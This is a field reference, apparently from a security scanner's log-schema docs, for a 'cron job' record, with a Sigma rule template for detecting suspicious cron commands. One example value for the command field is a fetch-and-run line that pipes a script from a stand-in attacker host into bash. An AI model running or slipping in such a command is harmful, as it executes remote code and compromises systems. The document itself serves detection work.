# cron job

**Schema ID:** `https://github.com/NextronSystems/jsonlog/thorlog/v3/cron-job` | **JSON Schema:** `https://json-schema.org/draft/2020-12/schema` | **Definition:** `CronJob`

## Fields

Field names are shown in **UPPERCASE** as used in Sigma rules.
The lowercase JSON name is shown in parentheses for reference.

| Sigma Field | JSON Name | Type | Required | Description | Example Values |
|-------------|-----------|------|----------|-------------|----------------|
| `COMMAND` | `command` | string | ✅ |  | `/usr/bin/certbot renew`, `curl -s http://evil.com/payload | bash`, `/opt/backup.sh` |
| `SCHEDULE` | `schedule` | string | ✅ |  | `0 2 * * *`, `*/5 * * * *`, `@daily` |
| `TYPE` | `type` | string | ✅ |  | `cron job` |
| `USER` | `user` | string | ✅ |  | `root`, `neo` |

_No nested fields in this type._

## Sigma Rule Template

```yaml
logsource:
    product: THOR
    service: "cron job"

detection:
    selection:
        COMMAND|contains: 'suspicious_command'
    condition: selection

level: medium
```
